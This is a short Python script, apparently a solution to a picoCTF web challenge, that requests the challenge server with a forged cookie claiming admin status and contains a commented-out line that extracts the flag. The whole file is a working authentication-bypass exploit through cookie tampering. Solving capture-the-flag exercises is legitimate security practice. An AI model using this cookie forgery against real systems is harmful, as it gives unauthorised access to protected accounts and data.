#!/usr/bin/python

import requests
import re

params = {'User': 'A', 'password': 'A', 'submit': 'Sign In'}

jar = {'admin': 'True', 'password': '', 'username': ''}

r = requests.get('http://jupiter.challenges.picoctf.org:13594', data=params, cookies=jar)

source = r.text
#print(re.findall(r'(picoCTF\{.+\})', source)[0])